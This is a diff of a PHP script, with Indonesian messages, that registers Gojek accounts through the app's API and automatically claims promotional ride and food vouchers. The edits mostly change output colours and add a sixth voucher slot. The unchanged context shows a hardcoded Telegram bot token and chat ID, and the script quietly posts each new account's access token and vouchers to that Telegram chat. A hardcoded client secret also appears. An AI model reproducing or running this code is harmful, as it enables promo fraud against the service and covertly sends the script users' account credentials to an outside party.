@@ -42,21 +42,21 @@ echo color("red"," ======================================\n");
         $register = request("/v5/customers", null, $data);
         if(strpos($register, '"otp_token"')){
         $otptoken = getStr('"otp_token":"','"',$register);
-        echo color("white","+] Kode verifikasi sudah di kirim")."\n";
+        echo color("yellow","+] Kode verifikasi sudah di kirim")."\n";
         otp:
         echo color("red","?] Otp: ");
         $otp = trim(fgets(STDIN));
         $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
         $verif = request("/v5/customers/phone/verify", null, $data1);
         if(strpos($verif, '"access_token"')){
-        echo color("white","+] Berhasil mendaftar\n");
+        echo color("yellow","+] Berhasil mendaftar\n");
         $token = getStr('"access_token":"','"',$verif);
         $uuid = getStr('"resource_owner_id":',',',$verif);
         echo color("red","+] Your access token : ".$token."\n\n");
         save("token.txt",$token);
         echo color("red","\n===========(REDEEM VOUCHER)===========");
         echo "\n".color("white","!] Claim voc GORIDE 8K");
-        echo "\n".color("white","!] Please wait");
+        echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
         sleep(1);
@@ -69,7 +69,7 @@ echo color("red"," ======================================\n");
         }else{
         echo "\n".color("red","-] Message: ".$message);
         echo "\n".color("white","!] Claim voc 15 10");
-        echo "\n".color("white","!] Please wait");
+        echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
         sleep(1);
@@ -84,7 +84,7 @@ echo color("red"," ======================================\n");
         echo "\n".color("red","+] Message: ".$messageboba19);
         goride:
         echo "\n".color("white","!] Claim voc GOFOOD 15 10");
-        echo "\n".color("white","!] Please wait");
+        echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("white",".");
         sleep(1);
@@ -94,7 +94,7 @@ echo color("red"," ======================================\n");
         $message1 = fetch_value($goride,'"message":"','"');
         echo "\n".color("red","+] Message: ".$message1);
         echo "\n".color("white","!] Claim voc GOCAR 8K");
-        echo "\n".color("white","!] Please wait");
+        echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("white",".");
         sleep(1);
@@ -111,21 +111,24 @@ echo color("red"," ======================================\n");
         $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
         $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
         $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
+        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
         echo "\n".color("white","!] Total voucher ".$total." : ");
         echo color("red","1. ".$voucher1);
         echo "\n".color("red","                     2. ".$voucher2);
         echo "\n".color("red","                     3. ".$voucher3);
         echo "\n".color("red","                     4. ".$voucher4);
         echo "\n".color("red","                     5. ".$voucher5);
+        echo "\n".color("red","                     6. ".$voucher6);
         echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
         $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
+        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
 	$chatid = "785784404";
-	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]";
+	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]";
 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 	$post = [
@@ -166,7 +169,6 @@ echo color("red"," ======================================\n");
          echo color("red","-] GAGAL!!!\n");
          }
          }
-         goto setpin;
          }
          }else{
          echo color("red","-] Otp yang anda input salah");
